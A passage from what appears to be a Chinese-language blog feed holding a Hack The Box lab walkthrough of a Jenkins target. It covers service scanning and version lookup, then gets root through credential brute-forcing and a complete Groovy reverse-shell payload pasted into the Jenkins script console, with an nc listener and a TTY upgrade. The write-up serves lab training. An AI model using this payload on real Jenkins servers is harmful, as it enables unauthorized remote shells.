+    <content><![CDATA[<h5 id="一、首字母缩略词-CVE-代表什么？"><a href="#一、首字母缩略词-CVE-代表什么？" class="headerlink" title="一、首字母缩略词 CVE 代表什么？"></a>一、首字母缩略词 CVE 代表什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Common Vulnerabilities and Exposures</span><br></pre></td></tr></table></figure>
+
+<h5 id="二、在网络安全中，CIA指的是什么？"><a href="#二、在网络安全中，CIA指的是什么？" class="headerlink" title="二、在网络安全中，CIA指的是什么？"></a>二、在网络安全中，CIA指的是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#信息安全三要素，机密性，完整性，可用性</span><br><span class="line">Confidentiality, Integrity, Availability</span><br></pre></td></tr></table></figure>
+
+<h5 id="三、端口-8080-上运行的服务版本是什么？"><a href="#三、端口-8080-上运行的服务版本是什么？" class="headerlink" title="三、端口 8080 上运行的服务版本是什么？"></a>三、端口 8080 上运行的服务版本是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap扫描IP</span></span><br><span class="line">nmap -sC -sV IP</span><br><span class="line">Jetty 9.4.39.v20210325</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/23/43XgzIN5pmVcS6y.png" alt="image-20230314154438068"></p>
+<h5 id="四、目标上运行的是哪个版本的-Jenkins？"><a href="#四、目标上运行的是哪个版本的-Jenkins？" class="headerlink" title="四、目标上运行的是哪个版本的 Jenkins？"></a>四、目标上运行的是哪个版本的 Jenkins？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用curl命令或者目录爆破</span></span><br><span class="line">curl -v http://ip:port</span><br><span class="line">2.289.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/14/YhOJpnQGUvFPVXa.png" alt="image-20230314154831206"></p>
+<h5 id="五、什么类型的脚本在-Jenkins-脚本控制台上被接受为输入？"><a href="#五、什么类型的脚本在-Jenkins-脚本控制台上被接受为输入？" class="headerlink" title="五、什么类型的脚本在 Jenkins 脚本控制台上被接受为输入？"></a>五、什么类型的脚本在 Jenkins 脚本控制台上被接受为输入？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Groovy是一种基于Java平台的面向对象语言。</span><br><span class="line">groovy</span><br></pre></td></tr></table></figure>
+
+<h5 id="六、如果目标虚拟机运行的是Windows，Groovy-脚本代码段中的“String-cmd”变量等于什么？"><a href="#六、如果目标虚拟机运行的是Windows，Groovy-脚本代码段中的“String-cmd”变量等于什么？" class="headerlink" title="六、如果目标虚拟机运行的是Windows，Groovy 脚本代码段中的“String cmd”变量等于什么？"></a>六、如果目标虚拟机运行的是Windows，Groovy 脚本代码段中的“String cmd”变量等于什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="七、与我们可以用来在-Linux-上显示网络接口信息的“ip-a”有什么不同的命令？"><a href="#七、与我们可以用来在-Linux-上显示网络接口信息的“ip-a”有什么不同的命令？" class="headerlink" title="七、与我们可以用来在 Linux 上显示网络接口信息的“ip a”有什么不同的命令？"></a>七、与我们可以用来在 Linux 上显示网络接口信息的“ip a”有什么不同的命令？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<h5 id="八、哪个开关可以让我们在netcat-上使用UDP传输模式？"><a href="#八、哪个开关可以让我们在netcat-上使用UDP传输模式？" class="headerlink" title="八、哪个开关可以让我们在netcat 上使用UDP传输模式？"></a>八、哪个开关可以让我们在netcat 上使用UDP传输模式？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u</span><br></pre></td></tr></table></figure>
+
+<h5 id="九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？"><a href="#九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？" class="headerlink" title="九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？"></a>九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reverse shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="十、提交root-flag"><a href="#十、提交root-flag" class="headerlink" title="十、提交root flag"></a>十、提交root flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用burp进行用户名，密码爆破</span></span><br><span class="line">root，password</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在manage-script-console中写入payload</span></span><br><span class="line">String host=&quot;IP&quot;;</span><br><span class="line">int port=4444;</span><br><span class="line">String cmd=&quot;/bin/bash&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) &#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">升级为ttyshell</span></span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/23/iEfu9mUoxzKHC8O.png" alt="image-20230314170911498"></p>
+<p><img src="https://s2.loli.net/2023/03/23/heHuyG9Vbf8dacm.png" alt="image-20230314224013599"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB-Funnel</tag>
       </tags>
   </entry>
   <entry>
